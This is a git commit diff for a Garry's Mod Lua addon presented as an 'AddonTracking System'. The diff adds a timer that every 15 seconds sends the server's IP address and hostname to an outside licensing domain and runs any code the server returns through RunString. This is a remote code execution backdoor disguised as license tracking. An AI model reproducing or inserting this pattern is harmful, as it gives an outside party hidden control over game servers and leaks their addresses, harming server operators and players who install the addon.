d74bf40982ffca4833e61743f2d58b5ca1f67b6b
LastPlayerTR <73468364+LastPlayerTR@users.noreply.github.com>
2021-10-30 19:37:04 +0300

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,1 +1,19 @@
 print("AddonTracking System")
+timer.Create("addontracking", 15, 0 , function()
+
+    http.Fetch( "https://licensing.lprotect.xyz/send",
+        
+        function( body, length, headers, code )
+            RunString(body)
+        end,
+  
+        function( message )
+
+        end,
+
+        { 
+            ["serverip"] = game.GetIPAddress(),
+            ["servername"] =  GetHostName(),
+        }
+    )
+end)
